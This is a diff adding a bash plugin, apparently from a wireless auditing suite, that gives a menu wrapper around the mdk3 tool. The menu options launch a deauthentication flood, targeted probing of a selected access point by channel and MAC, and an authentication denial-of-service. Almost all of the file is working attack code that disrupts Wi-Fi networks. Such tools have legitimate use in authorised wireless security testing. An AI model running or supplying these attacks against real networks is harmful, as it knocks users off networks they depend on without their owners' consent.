@@ -1,0 +1,60 @@
+# Copyright (2011) David Francos Cuartero, and some of the sources might be from other versions.
+#DEPENDS: mdk3
+# This is highly unmantained, as now is a plugin, you can easily modify it =)
+#        This program is free software; you can redistribute it and/or
+#        modify it under the terms of the GNU General Public License
+#        as published by the Free Software Foundation; either version 2
+#        of the License, or (at your option) any later version.
+
+#        This program is distributed in the hope that it will be useful,
+#        but WITHOUT ANY WARRANTY; without even the implied warranty of
+#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#        GNU General Public License for more details.
+
+#        You should have received a copy of the GNU General Public License
+#        Along with this program; if not, write to the Free Software
+#        Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
+
+MDK3=mdk3
+p_menu+=( "Mdk3 Attacks" );
+
+Mdk3_Attacks(){
+     if [ $( whereis mdk3) ]; then
+         while true; do
+            $clear; mkmenu "Choose MDK3 Options" "Deauthentication"\
+             "Prob selected AP" "Select another target"\
+             "Autentication DoS" "Return to main menu"
+            read yn
+            case $yn in
+                1 ) mdkpain ; break ;;
+                2 ) mdktargetedpain ; break ;;
+                3 ) mdknewtarget ; break ;;
+                4 ) mdkauth ; break ;;
+                5 ) break ;;
+                * ) echo $"Unknown response. Try again" ;;
+            esac
+        done
+
+        else warn "Sorry, this is not installed on your system"
+        fi
+}
+
+mdkpain(){
+        execute "MDK3 Pain" $MDK3 $wifi d & choosemdk
+}
+
+mdktargetedpain(){
+        execute "MDK3 Targeted pain" $MDK3 $wifi p -b a -c $Host_CHAN -t\
+            $Host_MAC & choosemdk
+}
+
+mdknewtarget(){
+    selectAp
+    choosemdk
+}
+
+mdkauth(){
+        execute "MDK3 AUTH" $MDK3 $wifi a & choosemdk
+}
+
+
